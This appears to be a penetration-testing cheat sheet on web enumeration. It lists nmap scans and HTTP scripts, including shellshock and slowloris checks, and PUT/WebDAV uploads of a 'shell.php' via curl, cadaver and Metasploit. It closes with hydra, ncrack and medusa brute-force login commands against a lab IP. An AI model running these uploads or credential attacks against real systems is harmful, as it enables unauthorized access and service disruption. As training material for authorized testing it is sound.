## Web Enumeration

Web enumeration means to look out info about services running on port, versions, languages, directories and more.

## Most Useful web ports.

| Service | Port No. | Protocol |
|---------|----------|----------|
| HTTP | 80,8080,8081,8000 | TCP |
| HTTPS | 443,8443,4443 | TCP |
| Tomcat Startup | 8080 | TCP |
| Tomcat Startup (SSL) | 8443 | TCP |
| Tomcat Shutdown | 8005 | TCP |
| Tomcat AJP Connector | 8009 | TCP |
| Glassfish HTTP | 8080 | TCP |
| Glassfish HTTPS | 8181 | TCP |
| Glassfish Admin Server | 4848 | TCP |
| Jetty | 8080 | TCP |
| Jonas Admin Console | 9000 | TCP |

## nmap

	  -Pn: Treat all hosts as online -- skip host discovery
	  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
	  -p <port ranges>: Only scan specified ports
	  -sV: Probe open ports to determine service/version info
	  -sC: equivalent to --script=default
	  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
		   directories, script-files or script-categories
	  -O: Enable OS detection
	  -oA <basename>: Output in the three major formats at once
	  -v: Increase verbosity level (use -vv or more for greater effect)
	  -A: Enable OS detection, version detection, script scanning, and traceroute

## Finding Open Ports

	# nmap -sT -v -p- $IP

	# nmap -sT -v -p- -oA allports $IP ##Save Output in File

	# nmap -Pn -sT -v -p- $IP

## Check Running Service Version

	# nmap -sT -sV -sC -A -O -v -p 80,443 $IP

	# nmap -Pn -sT -sV -sC -A -O -v -p 80,443 $IP

## Obtaining Information using nmap Scripts

	# ls /usr/share/nmap/scripts/ | grep http

	# nmap -sT -sV -v -p 80,443 --script=http-enum.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-php-version.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-put.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-shellshock.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-slowloris.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-vhosts.nse $IP

## HTTP Method

| Method | Syntax | Description |
|--------|--------|-------------|
| GET | GET /index.html |GET method requests a representation of the specified resource. Requests using GET should only retrieve data. |
| HEAD | HEAD /index.html |HEAD method requests the headers that would be returned if the HEAD request's URL was instead requested with the HTTP GET method.  |
| POST | POST /test |POST method is used to submit an entity to the specified resource, often causing a change in state or side effects on the server. |
| PUT | PUT /new.html HTTP/1.1 | The PUT method replaces all current representations of the target resource with the request payload. |
| DELETE | DELETE /file.html HTTP/1.1 |DELETE request method deletes the specified resource. |
| CONNECT | CONNECT www.example.com:443 HTTP/1.1 |CONNECT method starts two-way communications with the requested resource. It can be used to open a tunnel. |
| OPTIONS | OPTIONS /index.html HTTP/1.1 |OPTIONS method requests permitted communication options for a given URL or server. A client can specify a URL with this method, or an asterisk (*) to refer to the entire server. |
| TRACE | TRACE /index.html |TRACE method performs a message loop-back test along the path to the target resource, providing a useful debugging mechanism. |
| PATCH | PATCH /file.txt HTTP/1.1 |PATCH request method applies partial modifications to a resource. |

Detecting Available Methods 

	# nmap -sT -sV -v -p 80,443 --script=http-methods.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-method-tamper.nse $IP

If PUT method is allow so we can use below commands to upload file.

	# nmap -p 80 --script http-methods --script-args http-methods.url-path='/index.php' $IP

	# nmap -p 80 --script http-methods --script-args http-method.test-all ='/192.168.1.100' 192.168.1.100

	# nmap -p 80 192.168.1.100 --script http-put --script-args http-put.url='/dav/test.php',http-put.file='/dev/shm/test.php'

We can also use nc / netcat to check available methods.

	# nc 192.168.1.100 80
		HEAD /admin HTTP/1.1

	# nc 192.168.1.100 80
		TRACE / HTTP/1.1

	# nc 192.168.1.100 80
		OPTIONS  http://192.168.1.100 / HTTP/1.0
		
Below are the basic tools to enumerate about available methods.

	# curl -X GET 192.168.1.100

	# curl -X OPTIONS 192.168.1.100

	# curl -X OPTIONS 192.168.1.100/webdev -v

	# curl -X POST 192.168.1.100

	# curl -X PUT 192.168.1.100/uploads

	# curl -X DELETE 192.168.1.100

	# curl 192.168.1.100/uploads --upload-file demo.txt

	# curl -I 192.168.1.100

	# nikto -h 192.168.1.100

	# davtest --help

	# davtest -url http://192.168.1.100/dav/

	# cadaver --help

	# cadaver http://192.168.1.100/dav/
		put /dev/shm/shell.php

	# msfconsole
		msf> use auxiliary/scanner/http/http_put
		msf>auxiliary (http_put) > set rhosts 192.168.1.100

## HTTP Basic Authentication

HTTP Basic Authentication implementation is the tehnique for enforce access control of the web server from unauthorised access, It doesn't required cookies.

## Exploiting Tools

### hydra

	Hydra is a parallelized login cracker which supports numerous protocols to attack. New modules are easy to add, beside that, it is flexible and very fast.
  This tool gives researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system

	-L denotes the path of username List
	-P denotes the path of Password List
	-l represent the username
	-p represent the password

	# hydra -L user.txt -P pass.txt 192.168.1.100 http-get

### ncrack

Ncrack is an open source tool for network authentication cracking. It was designed for high-speed parallel cracking using a dynamic engine that can adapt to
different network situations. Ncrack can also be extensively fine-tuned for special cases, though the default parameters are generic enough to cover almost
every situation. It is built on a modular architecture that allows for easy extension to support additional protocols. Ncrack is designed for companies and
security professionals to audit large networks for default or weak passwords in a rapid and reliable way. It can also be used to conduct fairly sophisticated
and intensive brute force attacks against individual services.

	-v Verbosity
	-U Denotes the path of user list
	-P Denotes the path of password list
	-user Denotes the username with comma seprated
	-pass Denotes the password with comma seprated
	-T[0-5] set timing template

	# ncrack -v -U user.txt -P pass.txt http://192.168.1.100

	# ncrack -v --user user.txt --pass pass.txt http://192.168.1.100

	# ncrack -v -user admin -P pass.txt http://192.168.1.100

	# ncrack -v -user admin,administrator -p pass,password,pass@123 http://192.168.1.100

	# ncrack -v -user admin,administrator -P pass.txt http://192.168.1.100

### Medusa

Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer.  The goal is to support as many services which allow remote authentication
as possible. The author considers following items to some of the key features of this application:

	-h host or url
	-U Denotes the path of user list
	-P Denotes the path of passowrd list
	-u Denotes the username with comma seprated
	-p Denotes the password with comma seprated
	-c Denotes the combo file colon seprated
	-M module name to be execute.

	# medusa -h 192.168.1.100 -U user.txt -p p@$$w0rd -M http -f

	# medusa -h 192.168.1.100 -u admin -P pass.txt -M http -f

	# medusa -h 192.168.1.100 -U user.txt -P pass.txt -M http -f

	# medusa -h 192.168.1.100 -c combo.txt -M http -f
	[-c Combo files are colon separated and in the following format: host:user:password]
